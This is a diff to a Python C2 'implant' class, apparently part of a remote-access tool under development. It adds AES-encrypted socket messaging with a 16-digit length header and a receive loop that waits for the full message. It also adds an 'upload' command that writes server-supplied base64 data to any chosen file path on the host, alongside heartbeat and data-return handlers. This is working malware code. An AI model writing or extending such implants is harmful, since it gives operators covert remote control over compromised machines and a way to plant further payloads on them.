@@ -56,16 +56,16 @@ class implant:
     def send_msg(self, data):
         aes = C2_AES(self.aes_secret)
         msg = aes.encrypt(data)
-        self.sock.send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+        self.sock.send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
 
     def communicate(self):
         while True:
-            data_len = self.sock.recv(8)
+            data_len = self.sock.recv(16)
             data = self.sock.recv(int(data_len.decode()))
+            while len(data) != int(data_len):
+                data += self.sock.recv(int(data_len.decode()))
             aes = C2_AES(self.aes_secret)
-            print(data)
             data = aes.decrypt(data)
-            
             data = json.loads(data)
             print(f"Recieved {data['command']}")
             if data['command'] == "test":
@@ -80,6 +80,15 @@ class implant:
                 self.send_msg(data.decode())
             elif data['command'] == "heartbeat":
                 self.send_msg("im alive")
+            elif "upload" in data["command"]:
+                filename = data['command'].split()[1]
+                location = data['command'].split()[2]
+                upload_data = data["data"]
+                if filename.split('/')[-1].split(":")[-1] == location.split("/")[-1]:
+                    with open(location.split(":")[-1], 'wb') as f:
+                        f.write(base64.b64decode(upload_data))
+                self.send_msg("File Uploaded!")
+
 
     def intro(self):
         key_gen = key()
